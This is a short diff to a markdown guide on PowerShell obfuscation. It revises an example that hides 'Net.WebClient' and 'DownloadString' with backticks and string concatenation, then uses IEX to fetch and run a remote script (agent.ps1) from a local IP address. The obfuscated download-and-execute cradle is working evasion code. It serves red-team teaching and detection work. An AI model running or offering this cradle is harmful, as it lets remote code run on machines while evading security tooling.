@@ -171,8 +171,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      $get="N`et.Web`Cli`ent"
-      powershell.exe IEX (New-Object $get).D`ow`nloa`dSt`rin`g('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
+      $get="N`et.Web`Cli`ent"              <-- caret ` inside double quotes
+      $Dow='Do'+'wn'+'loa'+'dStri'+'ng'    <-- caret + inside single quotes
+      powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
+
+![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
 
 ---
 
